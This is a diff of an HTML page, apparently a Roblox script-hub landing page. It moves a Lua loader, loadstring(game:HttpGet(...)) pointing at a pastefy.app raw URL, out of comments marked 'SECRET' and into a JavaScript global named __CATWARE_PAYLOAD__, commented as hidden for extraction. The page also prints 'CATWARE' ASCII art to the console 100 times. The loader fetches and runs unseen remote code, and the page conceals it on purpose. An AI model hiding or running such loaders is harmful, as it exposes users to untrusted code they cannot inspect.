@@ -67,9 +67,6 @@
             transform: translateX(3px);
         }
     </style>
-
-    <!-- SECRET EMBEDDED SCRIPT FOR EXECUTION -->
-    <!-- loadstring(game:HttpGet("https://pastefy.app/Q1lJi8vk/raw"))() -->
 </head>
 <body>
 
@@ -84,10 +81,76 @@
         <a href="https://zonefn.us" class="home-btn">back to home &rarr;</a>
     </div>
 
-    <!-- RAW SCRIPT ENDPOINT DATA (FOR HTTPGET EXECUTION) -->
-    <script id="raw-script" type="text/plain">
-        loadstring(game:HttpGet("https://pastefy.app/Q1lJi8vk/raw"))()
-    </script>
+    <!-- CONSOLE LOG 100X & SECRET LOADSTRING -->
+    <script>
+        const asciiArt = `-- [[ ██████╗ 
+    ██╔════╝ 
+    ██║      
+    ██║      
+     ██████╗ 
+  
 
+  
+    
+     █████╗ 
+    ██╔══██╗
+    ███████║
+    ██╔══██║
+    ██║  ██║
+  
+
+  
+    
+    ████████╗
+    ╚══██╔══╝
+       ██║   
+       ██║   
+       ██║   
+  
+
+  
+    
+    ██╗    ██╗
+    ██║    ██║
+    ██║ █╗ ██║
+    ██║███╗██║
+    ╚███╔███╔╝
+  
+
+  
+    
+     █████╗ 
+    ██╔══██╗
+    ███████║
+    ██╔══██║
+    ██║  ██║
+  
+
+  
+    
+    ██████╗ 
+    ██╔══██╗
+    ██████╔╝
+    ██╔══██╗
+    ██║  ██║
+  
+
+  
+    
+    ███████╗
+    ██╔════╝
+    █████╗  
+    ██╔══╝  
+    ███████╗
+  ]]`;
+
+        // Loop and print 100 times to console
+        for (let i = 1; i <= 100; i++) {
+            console.log(`[#${i}]\n` + asciiArt);
+        }
+
+        // Hidden in JS memory for HttpGet extraction
+        window.__CATWARE_PAYLOAD__ = 'loadstring(game:HttpGet("https://pastefy.app/Q1lJi8vk/raw"))()';
+    </script>
 </body>
 </html>
